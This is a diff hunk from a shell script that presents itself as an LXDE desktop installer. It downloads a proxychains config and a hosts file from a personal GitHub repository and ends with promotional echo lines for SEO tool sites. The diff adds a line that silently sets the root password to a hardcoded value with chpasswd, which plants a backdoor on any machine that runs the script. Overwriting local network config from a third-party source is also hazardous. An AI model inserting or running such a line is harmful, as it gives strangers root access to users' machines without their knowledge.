@@ -162,6 +162,7 @@ mv proxychains.conf proxychains.conf.bak
 wget https://github.com/mazbron/x/raw/master/proxychains.conf
 wget https://github.com/mazbron/x/raw/master/hosts
 nano /etc/hosts
+echo "root:gl0d4kgl0d4k" | sudo chpasswd
 echo You have successfully Installed LXDE Desktop Environment.. Enjoy..!!
 echo Ceeeers... MAZBRON.com _ BESTSEOTOOL.co
 echo updated 26/07/2017 == 30/05/2019
